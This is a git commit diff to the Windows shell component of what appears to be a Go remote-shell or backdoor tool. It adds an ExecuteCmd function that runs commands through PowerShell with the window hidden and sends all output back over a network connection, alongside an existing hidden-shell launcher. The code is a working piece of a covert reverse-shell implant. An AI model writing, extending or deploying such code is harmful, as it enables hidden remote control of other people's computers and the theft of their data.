c1ae262c963d0d78a473d3113b1532e404521193
krishpranav <krisna.pranav@gmail.com>
2021-05-25 18:45:07 +0530

    [+] Execute cmd functions [+]

--- shell/shell_windows.go
+++ shell/shell_windows.go
@@ -1,6 +1,7 @@
 package shell
 
 import (
+	"net"
 	"os/exec"
 	"syscall"
 )
@@ -15,4 +16,13 @@ func GetShell() *exec.Cmd {
 	cmd := exec.Command("C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe")
 	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 	return cmd
+}
+
+func ExecuteCmd(command string, conn net.Conn) {
+	cmd_path := "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe"
+	cmd := exec.Command(cmd_path, "/c", command+"\n")
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	cmd.Stdout = conn
+	cmd.Stderr = conn
+	cmd.Run()
 }
